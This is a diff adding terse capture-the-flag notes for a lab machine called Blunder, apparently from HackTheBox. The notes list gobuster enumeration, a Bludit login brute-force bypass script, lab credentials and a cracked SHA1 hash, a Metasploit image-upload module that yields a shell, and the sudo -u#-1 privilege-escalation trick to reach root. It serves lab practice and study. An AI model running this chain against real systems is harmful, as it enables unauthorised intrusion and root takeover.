@@ -1,0 +1,23 @@
+//based on egotisticalSW
+bludit
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.191 -o gobuster.txt -x txt,php,html,htm
+
+https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+exploit.py				//adding url, user, pass and wordlist
+cewl 10.10.10.191 > wordlist.txt
+
+python3 exploit.py
+fergus : RolandDeschain
+
+msfconsole
+search bludit
+use linux/http/bludit_upload_images_exec	//rhost, user,pass, got shell
+
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases/users.php
+Hugo : faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120		//sha1 hash
+
+su - hugo		//got user
+sudo -l
+(ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash	//got root 
